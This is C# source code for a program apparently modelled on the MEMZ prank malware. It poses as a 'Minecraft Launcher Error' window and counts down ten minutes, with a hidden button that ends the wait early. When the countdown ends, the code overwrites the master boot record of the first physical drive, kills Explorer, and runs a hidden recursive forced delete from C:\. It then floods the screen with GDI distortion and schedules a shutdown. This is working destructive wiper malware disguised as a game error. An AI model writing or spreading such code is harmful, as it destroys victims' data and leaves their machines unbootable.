using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace MemzProject
{
    class Program : Form
    {
        [DllImport("kernel32.dll")] static extern IntPtr CreateFile(string lp, uint da, uint sm, IntPtr sa, uint cd, uint fa, IntPtr h);
        [DllImport("kernel32.dll")] static extern bool WriteFile(IntPtr h, byte[] b, uint n, out uint w, IntPtr o);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcD, int x, int y, int w, int h, IntPtr hdcS, int xs, int ys, int r);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);

        private int timeLeft = 600; // 10 minut
        private Label lblTimer;

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.Run(new Program());
        }

        public Program()
        {
            this.Text = "Minecraft Launcher Error";
            this.Size = new Size(400, 200);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.Black;
            this.ForeColor = Color.White;
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;

            lblTimer = new Label() { Text = "10:00", Font = new Font("Consolas", 36), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
            
            // Ukryty przycisk "Destroy Now" (niewidoczna kropka w rogu)
            Button btnDestroy = new Button() { Text = ".", Location = new Point(0, 180), Size = new Size(20, 20), FlatStyle = FlatStyle.Flat, ForeColor = Color.Black };
            btnDestroy.Click += (s, e) => { timeLeft = 0; };

            this.Controls.Add(lblTimer);
            this.Controls.Add(btnDestroy);

            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 1000 };
            t.Tick += (s, e) => {
                if (timeLeft > 0) {
                    timeLeft--;
                    lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss");
                } else {
                    t.Stop();
                    ExecuteDestruction();
                }
            };
            t.Start();
        }

        void ExecuteDestruction()
        {
            // 1. NADPISANIE MBR (NATYCHMIAST)
            try {
                uint written;
                IntPtr drive = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                WriteFile(drive, new byte[512], 512, out written, IntPtr.Zero);
            } catch { }

            // 2. USUNIĘCIE WSZYSTKICH PLIKÓW (del /s /q /f *.*)
            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f *.*") { 
                WindowStyle = ProcessWindowStyle.Hidden,
                WorkingDirectory = "C:\\" 
            });

            // 3. EFEKTY WIZUALNE (GDI RAVE)
            Thread gdi = new Thread(() => {
                Random rnd = new Random();
                IntPtr hdc = GetDC(IntPtr.Zero);
                while(true) {
                    BitBlt(hdc, rnd.Next(-5, 5), rnd.Next(-5, 5), 2000, 2000, hdc, 0, 0, 0x00990066);
                    Thread.Sleep(10);
                }
            });
            gdi.Start();

            // 4. SHUTDOWN PO 5 MINUTACH (300 SEKUND) Z TWOIM TEKSTEM
            Process.Start("shutdown", "/s /t 300 /c \"PC saying BYE BYE\"");
            
            lblTimer.Text = "BYE BYE";
            lblTimer.ForeColor = Color.Red;
        }
    }
}
